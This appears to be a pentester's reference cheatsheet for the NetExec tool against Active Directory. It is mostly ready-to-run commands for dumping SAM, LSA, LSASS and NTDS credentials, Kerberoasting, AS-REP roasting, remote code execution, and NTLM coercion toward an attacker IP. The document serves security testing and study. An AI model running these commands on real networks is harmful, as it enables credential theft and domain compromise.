+++
title = "Netexec"
+++

- https://www.netexec.wiki/getting-started/selecting-and-using-a-protocol
    - Logs: `~/.nxc/logs/`
- Cheatsheet: https://gist.github.com/strikoder/99635df00444bbf5fc90ca83ec8051a0
- by default, `netxec` attempts to authenticate with passwords or hashes at the domain level... use `--local-auth` to force local authentication
    - **Note: ` --local-auth` NEVER works with DCs**

Netexec (formerly CrackMapExec) is a swiss army knife for pentesting networks that helps automate assessing the security of large networks in AD environments. Netexec uses `impacket` libraries under its hood

### Meaning of `Pwn3d!` per protocol

- https://www.netexec.wiki/getting-started/using-credentials#using-credentials

Usually only `smb` or `winrm` are "true" admin, but the rest usually include some level of code execution.

| Protocol | What `Pwn3d!` means             | How it checks                                                             |
| -------- | ------------------------------- | ------------------------------------------------------------------------- |
| `smb`    | Local admin on the machine      | Can write to `ADMIN$` / `C$`, member of local Administrators group        |
| `winrm`  | Remote shell access             | Code execution possible — local admin OR `Remote Management Users` member |
| `ldap`   | Path to Domain Admin exists     | Account has DCSync rights, is DA, or has privileged ACLs                  |
| `mssql`  | `sysadmin` role on SQL instance | SQL server role check, **completely separate from AD**                    |
| `rdp`    | RDP code execution available    | Account has RDP access — local admin OR `Remote Desktop Users` member     |
| `wmi`    | Local admin (WMI exec works)    | WMI process create succeeds, usually requires local admin                 |
| `ssh`    | Root access                     | Logged in as root, OR sudo without password possible                      |
| `ftp`    | **No admin check**              | Just shows `[+]` for valid auth, no `Pwn3d!` ever                         |
| `vnc`    | Code execution                  | VNC session established with control                                      |
| `nfs`    | Root/write access on share      | Can mount and write as root                                               |

**Key behavioral notes:**

- "With the SMB protocol, your compromised users are most likely in the (local) administrators group" when Pwn3d! appears [Palo Alto Networks](https://docs-cortex.paloaltonetworks.com/r/Cortex-XDR/Cortex-XDR-Analytics-Alert-Reference-by-Alert-name/Fodhelper.exe-UAC-bypass)
- "Code execution results in a (Pwn3d!) added after the login confirmation" — this is the universal rule across all code-execution-capable protocols [GitHub](https://github.com/CousTov/UACBypass)
- LDAP `Pwn3d!` is fundamentally different — it doesn't mean code execution, it means **AD privilege**. A user with DCSync gets `Pwn3d!` on LDAP but might be `[+]` only on SMB

## Kerberos

### Generate `hosts` File

For simple hostname to IP address resolution

```bash
nxc smb <DC_IP> --generate-hosts-file nxc_hosts && sudo cp -v /etc/hosts /etc/hosts.bak_$(date +%Y-%m-%d_%H:%M:%S) && cat nxc_hosts | sudo tee -a /etc/hosts
```

### Generate `krb5.conf` File

Configure host to talk to the KDC and to avoid `KRB_AP_ERR_SKEW` or "realm-not-found" errors (wrong KDC host, realm casing (**Kerberos realms are case-sensitive and usually uppercase**), etc.)

```bash
nxc smb <DC_FQDN> --generate-krb5-file krb5.conf && sudo mv -v /etc/krb5.conf /etc/krb5.conf.bak && sudo cp -v krb5.conf /etc/krb5.conf
```

### Usage

**Get a TGT (saves to `<USER>.ccache`):**
```bash
nxc smb <DC_FQDN> -u <USER> -p '<PASSWORD>' -k --generate-tgt <USER>
```

**Get a TGT from a PFX certificate:**
```bash
nxc smb <DC_FQDN> -u '<USER>' --pfx-cert <CERT>.pfx -k --generate-tgt '<USER>'
```

**Use an existing TGT from ccache `--use-kcache` since `-k` alone tries fresh TGT request:**
```bash
KRB5CCNAME=<USER>.ccache nxc smb <DC_FQDN> --use-kcache -k
```

## Database

- https://www.netexec.wiki/getting-started/database-general-usage

Only supports `proto` for `smb`, `mssql`, and `winrm`. Automatically saves collected data from `nxc` executions.

```bash
# Enter database
nxcdb

# Switch protocol
proto smb
proto mssql

# Credentials
creds
creds <USERNAME>
creds hash
creds plaintext
creds add <DOMAIN> <USER> <PASS>
creds remove <CRED_ID>

# Use credential ID directly in nxc
nxc smb <TARGET> -id <CRED_ID> -x whoami

# Hosts
hosts
hosts <HOSTNAME>

# Shares
shares

# Export
export creds detailed creds.csv
export hosts detailed hosts.csv
export shares detailed shares.csv
export local_admins detailed local_admins.csv
```

## Modules

- https://www.netexec.wiki/getting-started/using-modules

```bash
# Show modules for protocol
nxc <PROTOCOL> -L

# Show more info for module
nxc <PROTOCOL> -M <MODULE> --options

# Set modules options
# NOTE: SPACE BETWEEN MODULES
nxc <PROTOCOL> -M <MODULE> -o <MOD_KEY>=<MOD_VALUE> <MOD_KEY>=<MOD_VALUE>,...
```

## Protocol Spraying

- https://github.com/brandonwhitmire/nxcblast

**Spray valid creds against all protocols (local and domain auth) to see if one offers more privileges**
```bash
nxcblast <TARGET>
```

## SMB

### Basic Enumeration

Single command covers users, groups, shares, and password policy via null/anonymous session:

```bash
nxc smb <TARGET> -u '' -p '' --users --shares --pass-pol --rid-brute 10000
nxc ldap <DC_FQDN> -u '' -p '' --groups --computers

# Parse out users from RID brute
grep SidTypeUser nxc_rid_users.txt | cut -d "\\" -f 2 | cut -d " " -f 1 | grep -v \\$ > nxc_users.txt
```

### User Enumeration

#### Logged-on Users and Sessions

Shows various logged on users... useful to dump their live creds

```bash
nxc smb <TARGET> -u "<USERNAME>" -p "<PASSWORD>" --reg-sessions --loggedon-users --qwinsta
```

### Get machine IP address and domains

```bash
nxc smb <TARGET> -u <USER> -p '<PASSWORD>' -M get_netconnections -M ioxidresolver
```

### Credential Dumping

#### Hash Defaults

| Hash Value                             | Type   | Meaning                                                                                                                      |
| :------------------------------------- | :----- | :--------------------------------------------------------------------------------------------------------------------------- |
| **`aad3b435b51404eeaad3b435b51404ee`** | **LM** | **Empty / Disabled.** LM is disabled on modern Windows -- this placeholder appears for every user. Ignore it.               |
| **`31d6cfe0d16ae931b73c59d7e0c089c0`** | **NT** | **Empty String.** The user has **no password**. Common for `Guest` or `Administrator` if not enabled/set.                   |

#### Registry Secrets `--sam` and `--lsa`

SAM database secrets in `HKLM\SAM`. LSA domain and other secrets in `HKLM\SECURITY`;  [gives DCC2 hashes which are only crackable: not passable.]({{% ref "hashcat.md#windows-hashes" %}})

```bash
nxc smb <TARGET> --local-auth -u <USER> -p <PASSWORD> --sam --lsa
```

#### LSASS Dump

- https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-lsass

Active session hashes (or cleartest passwords) from process memory of `lsass.exe`

```bash
nxc smb <TARGET> -u <USER> -p '<PASS>' -M lsassy -M nanodump -M procdump -M handlekatz
```

#### NTDS Dump

- https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-ntds.dit
- **NOTE:** this can sometimes crash the DC:
    - https://github.com/Pennyw0rth/NetExec/discussions/329#discussioncomment-9594340


**Full dump with history and timestamps and Kerberos keys**
```bash
nxc smb <TARGET> -u <ADMIN_USER> -p <PASSWORD> --ntds --history --kerberos-keys
```

**Dump one account instead**
```bash
nxc smb <TARGET> -u <USER> -p <PASSWORD> --ntds --user Administrator
nxc smb <TARGET> -u <USER> -p <PASSWORD> --ntds --user krbtgt
```

**Server 2019+**
```bash
nxc smb <TARGET> -u <ADMIN_USER> -p <PASSWORD> -M ntdsutil
```

### Uploading and Getting Files

**Example `<FULL_FILE_PATH>`:**
- `'\\windows\system32\drivers\etc\hosts'`

**Download**
```bash
netexec smb <TARGET> -u <USER> -p '<PASSWORD>' --share <SHARE> --get-file '<FULL_FILE_PATH>' <OUT_FILE>
```

**Upload**
```bash
# NOTE: use '\Windows\Temp\FILE' or '\\SHARE\folder' without the drive letter
netexec smb <TARGET> -u <USER> -p '<PASSWORD>' --share <SHARE> --put-file <IN_FILE> '<FULL_FILE_PATH>'
```

#### `spider`

**Search for filename PATTERN like `password`**
```bash
netexec smb <TARGET> -u <USER> -p '<PASSWORD>' --spider <SHARE> --pattern "<PATTERN>"
```

**Search for file contents PATTERN like `password`**
```bash
netexec smb <TARGET> -u <USER> -p '<PASSWORD>' --spider <SHARE> --content --regex "<PATTERN>"
```

**Show all files in share**
```bash
netexec smb <TARGET> -u <USER> -p '<PASSWORD>' --spider <SHARE> --regex .
```

#### `spider_plus`

Bulk download all files from all shares except the excluded defaults; max file size `2 MB`

```bash
nxc smb <TARGET> -u <USER> -p <PASS> -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=$HOME/my_data/nxc_spider MAX_FILE_SIZE=$((2 * 1024 * 1024)) EXCLUDE_FILTER='admin$,c$,ipc$,print$'
```

### `gpp_password` and `gpp_autologin`

- https://adsecurity.org/?p=2288

**On DC only**, retrieves the plaintext password through Group Policy Preferences (GPP). Searches for `registry.xml` files to find autologin information (creds)

```bash
nxc smb <TARGET> -u <USER> -p <PASS> -M gpp_password -M gpp_autologin
```

### KeePass collection

```bash
# Find configs and database files
nxc smb <TARGET> -u <USER> -p '<PASSWORD>' -M keepass_discover

# Attempt to collect master pass
nxc smb <TARGET> -u <USER> -p '<PASSWORD>' -M keepass_trigger -o ACTION=ALL KEEPASS_CONFIG_PATH=<XML_CONFIG>

# Read passwords
grep -A1 -i password /tmp/export.xml

# Remove/clean trigger
nxc smb <TARGET> -u <USER> -p '<PASSWORD>' -M keepass_trigger -o ACTION=CLEAN KEEPASS_CONFIG_PATH=<XML_CONFIG>
```

#### Open KeePass

```bash
sudo apt install -y flatpak
flatpak remote-add --user --if-not-exists flathub https://dl.flathub.org/repo/flathub.flatpakrepo
flatpak install --assumeyes --user flathub org.keepassxc.KeePassXC
flatpak run org.keepassxc.KeePassXC
```

#### Manual Search

```powershell
Get-ChildItem -File -Recurse -ErrorAction SilentlyContinue -Path C:\ -Include *.kdbx
```

### Enable RDP

```bash
nxc smb <TARGET> -u <USER> -p '<PASSWORD>' -M rdp -o ACTION=enable
```

### `drop-sc`, `slinky`, and `scuffy` NTLM Coercion via Writable Share

- Run the same below commands with `CLEANUP=True` to delete file

**NOTE**: requires `WRITE` access to target share + Capturer (usually) inside the LAN

```bash
# Start Capturer
sudo responder -I <INTERFACE> -wv
.\Inveigh.exe -LLMNR Y -NBNS Y -Console 5 -FileOutput Y

# Drop the coercion file on the writable share
nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' -M drop-sc -o URL=\\<ATTACKER_IP>\secret FILENAME=secret
nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' -M slinky -o SERVER=<ATTACKER_IP> NAME=important
nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' -M scuffy -o SERVER=<ATTACKER_IP> NAME=update
```

## DC Vulnerability Scanning

- https://www.netexec.wiki/smb-protocol/scan-for-vulnerabilities

Triage a DC for unpatched critical vulnerabilities.

```bash
# No creds required
nxc smb <DC_IP> -M zerologon -M ms17-010
```

### Petitpotam, DFSCoerce, ShadowCoerce, Printerbug, MSEven

- `coerce_plus`: https://www.netexec.wiki/smb-protocol/scan-for-vulnerabilities#scan-for-coerce-vulnerabilities

Includes the popular forced authentication techniques

```bash
# Scan
nxc smb <DC_IP> -u <USER> -p '<PASS>' -M coerce_plus
```

```bash
# Trigger auth
nxc smb <DC_FQDN> -u <USER> -p '<PASS>' -M coerce_plus -o METHOD=<TECHNIQUE> LISTENER=<ATTACKER_IP>
```

## LDAP

- https://www.netexec.wiki/ldap-protocol/

**NOTE: requires use of the FQDN of the DOMAIN CONTROLLER only -- NOT IP address nor any other machine... add the FQDN to `/etc/hosts`**

### Anonymous LDAP Search

```bash
nxc ldap <DC_FQDN> -u '' -p '' --users --groups --computers --pass-pol --get-sid
```

### Admin Count Enumeration

Find high-value users with `adminCount=1` (includes `Domain Admins`, `Enterprise Admins`, `Backup Operators`, etc.):

```bash
# Enumerate users with adminCount=1 via LDAP
nxc ldap <DC_FQDN> -u <USER> -p <PASSWORD> --admin-count
```

### Discover IPs and domain names

```bash
# IP and domain names
netexec ldap <DC_FQDN> -u <USER> -p '<PASSWORD>' -M get-network -o ALL=true
```

### User Account Description

Both modules dump user descriptions for the accounts.

```bash
nxc ldap <DC_FQDN> -u <USER> -p '<PASSWORD>' -M get-desc-users -M user-desc
```

### `groupmembership`

Show a user's groups.

```bash
nxc ldap <DC_FQDN> -u <USER> -p '<PASSWORD>' -M groupmembership -o USER='<USER>'
```

### Unconstrained Delegation

Find accounts with `TRUSTED_FOR_DELEGATION` -- vulnerable to Kerberos unconstrained delegation attack:

```bash
nxc ldap <DC_FQDN> -u <USER> -p '<PASS>' --trusted-for-delegation
```

### Password Not Required

Find accounts with `PASSWD_NOTREQD` -- may have no password or shorter than policy:

```bash
nxc ldap <DC_FQDN> -u <USER> -p '<PASS>' --password-not-required
```

### Get Domain SID

Required for Golden Ticket and SID history attacks:

```bash
nxc ldap <DC_FQDN> -u <USER> -p '<PASS>' --get-sid
```

### gMSA Password Dump

gMSA passwords are auto-rotating 240-byte machine-managed credentials stored in AD that can be retrieved as an NT hash by any principal explicitly granted `PrincipalsAllowedToRetrieveManagedPassword` or `ReadGMSAPassword` (BloodHound)

Find who can read gMSA passwords, then dump the hash:

```bash
# Find accounts with PrincipalsAllowedToRetrieveManagedPassword
nxc smb <DC_FQDN> -u <USER> -p '<PASS>' -X "Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword"

# Dump gMSA NTLM hash with that user
nxc ldap <DC_FQDN> -u <GMSA_READER_USER> -p '<PASS>' --gmsa
```

### `adcs` (Certificates)

Active Directory Certificate Services (ADCS) is Windows' built-in PKI that issues and manages digital certificates -- misconfigurations in certificate templates can allow domain privilege escalation (ESC1-ESC8).

```bash
netexec ldap <DC_FQDN> -u <USER> -p '<PASSWORD>' -M adcs
```

### Recover Dead AD Objects

- REQUIRES: `Reanimate Tombstones` or other direct permission on the object

This uses an experimental `netexec` module to facilitate enumeration and recovery.

```bash
git clone https://github.com/Fabrizzio53/NetExec.git && cd NetExec
```

```bash
# Show deleted objects
uv run nxc/netexec.py ldap <DC_FQDN> -u <USER> -p <PASSWORD> -M tombstone -o ACTION=query

# Restore object by its SID
uv run nxc/netexec.py ldap <DC_FQDN> -u <USER> -p <PASSWORD> -M tombstone -o ACTION=restore ID=<SID>
```

### ASREPROAST

- https://www.netexec.wiki/ldap-protocol/asreproast

When `DONT_REQ_PREAUTH` is disabled, the pre-auth (password) is not required for the DC to send a TGT for a vulnerable account.

See [best user wordlists for good defaults to try first.]({{% ref "Docs/5 - Exploitation/online-credentials-attacks" %}}#best-wordlists)

```bash
# WITHOUT creds -- REQUIRES user list
# NOTE: might be incomplete
nxc ldap <DC_FQDN> -u <USERS_LIST> -p '' --asreproast nxc_asreproast_bruteforce.txt

# WITH any valid domain user -- finds ALL ACCOUNTS
nxc ldap <DC_FQDN> -u <USER> -p '<PASSWORD>' --asreproast nxc_asreproast_credentialed.txt
```

### KERBEROAST

- https://www.netexec.wiki/ldap-protocol/kerberoasting

Requests TGS tickets for accounts with SPNs set. The TGS is encrypted with the service account's password hash -- crackable offline.

```bash
# REQUIRES any valid domain user -- finds ALL SPN ACCOUNTS automatically
nxc ldap <DC_FQDN> -u <USER> -p '<PASSWORD>' --kerberoasting nxc_kerberoast.txt

# Targeted Kerberoast
nxc ldap <DC_FQDN> -u <USER> -p '<PASSWORD>' --kerberoasting nxc_targeted_kerberoast.txt --kerberoast-account <TARGET_USER>
```

## MSSQL

**NOTE:** this [protocol has file operations --get-file and --put-file functions as well](#uploading-and-getting-files)

[MSSQL has 3 types of authentication: domain, local auth, and SQL account; all 3 should be tried to find valid creds.](https://www.netexec.wiki/mssql-protocol/authentication)

```bash
# (domain) Active Directory Account
nxc mssql <TARGET> -d <DOMAIN>

# (local) Local Windows Account
# NOTE: does **NOT** work on DCs
nxc mssql <TARGET> -d .

# (application) SQL Account
nxc mssql <TARGET> --local-auth
```

### Enumeration

```bash
nxc mssql <TARGET> -d . -u '<USER>' -p '<PASSWORD>' -M mssql_priv

# List databases
nxc mssql <TARGET> -d . -u '<USER>' -p '<PASSWORD>' -q "SELECT name FROM master.dbo.sysdatabases"

# List databases
nxc mssql <TARGET> -d . -u '<USER>' -p '<PASSWORD>' -q "SELECT table_name FROM <DB>.information_schema.tables"

# Dump a table
nxc mssql <TARGET> -d . -u '<USER>' -p '<PASSWORD>' -q "SELECT * FROM <DB>.dbo.<TABLE>"
```

### Impersonation

```bash
nxc mssql <TARGET> -u <USER> -p '<PASSWORD>' -M mssql_priv -o ACTION=enum_priv

nxc mssql <TARGET> -u <USER> -p '<PASSWORD>' -M mssql_priv -o ACTION=privesc
```

## RDP

### Screenshot (no creds, NLA disabled)
```bash
nxc rdp <TARGET> --nla-screenshot
```

### Screenshot (with creds)
```bash
nxc rdp <TARGET> -u <USER> -p '<PASS>' --screenshot --screentime 5
```

## Command Execution

- Works with `smb`, `winrm` (admin not required), and `ssh`
- with `ssh --key-file` and no keyfile password, we must set the option `-p ""` to avoid errors
- Registry settings
    - Got `Pwn3d!` but `-x` fails → `LocalAccountTokenFilterPolicy` is `0`, you're not RID 500
    - RID 500 but `-x` fails → `FilterAdministratorToken` is `1`

```bash
reg.exe query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy

reg.exe query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v FilterAdministratorToken
```

| Registry Key                                                                                   | Default           | Value `0`                                       | Value `1`                                           |
| ---------------------------------------------------------------------------------------------- | ----------------- | ----------------------------------------------- | --------------------------------------------------- |
| `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` | `0` or **Absent** | Only RID 500 (built-in Admin) can exec remotely | **All** LOCAL (not domain) admins can exec remotely |
| `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`      | `0` or **Absent** | RID 500 can exec remotely                       | RID 500 **blocked** from remote exec                |

| `--exec-method` (SMB only) | Protocol | How                                                | Noise  | Port        |
| -------------------------- | -------- | -------------------------------------------------- | ------ | ----------- |
| `wmiexec` (default)        | WMI      | WMI process create; output via temp file on ADMIN$ | Medium | 135+445+RHP |
| `atexec`                   | SMB      | Scheduled task (unreliable on modern Windows)      | Lower  | 445         |
| `smbexec`                  | SMB      | Creates a Windows service                          | Medium | 445         |
| `mmcexec`                  | DCOM     | Creates a Windows service                          | Lowest | 135+445+RHP |

```bash
# cmd.exe
sudo nxc smb <TARGET> -u <USER> -p <PASSWORD> -x '<COMMAND>'

# PowerShell
sudo nxc smb <TARGET> -u <USER> -p <PASSWORD> -X '<COMMAND>'
```
